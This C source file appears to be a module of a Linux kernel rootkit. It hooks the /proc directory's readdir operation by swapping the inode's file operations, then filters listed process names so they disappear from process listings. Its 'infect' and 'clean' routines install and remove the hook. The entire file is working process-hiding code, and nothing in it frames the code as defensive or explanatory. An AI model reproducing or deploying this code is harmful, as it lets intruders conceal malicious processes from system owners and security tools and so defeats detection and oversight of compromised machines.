#include "processes.h"

extern stealth_t* state;
filldir_t proc_filldir = NULL;

void stealth_proc_hide(const char* name, size_t length)
{
    size_t real_length = min(length, (size_t) PROCESS_LENGTH);
    strncpy(state->hidden_processes[state->hidden_process_count++], name, real_length);
}

int stealth_proc_is_hidden(const char* name)
{
    int i = 0;
    for(; i < state->hidden_process_count; i++)
        if(strcmp(state->hidden_processes[i], name) == 0)
            return 1;
    return 0;
}

int stealth_proc_filldir(void* buf, const char* name, int nlen, loff_t off, u64 x, unsigned y)
{
    if(stealth_proc_is_hidden(name))
        return 0;

    return proc_filldir(buf, name, nlen, off, x, y);
}

int stealth_proc_readdir(struct file* f, void* buf, filldir_t filldir)
{
    proc_filldir = filldir;

    return state->orig_proc_fops->readdir(f, buf, stealth_proc_filldir);
}

int stealth_proc_infect(void)
{
    struct path p;

    if(kern_path("/proc/", 0, &p))
        return -1;

    state->proc_inode = p.dentry->d_inode;
    state->orig_proc_fops = state->proc_inode->i_fop;

    // HERE COMES ZE PATCH
    state->proc_fops = *state->proc_inode->i_fop;
    state->proc_fops.readdir = stealth_proc_readdir;
    state->proc_inode->i_fop = &state->proc_fops;

    return 0;
}

int stealth_proc_clean(void)
{
    state->proc_inode->i_fop = state->orig_proc_fops;
    return 0;
}
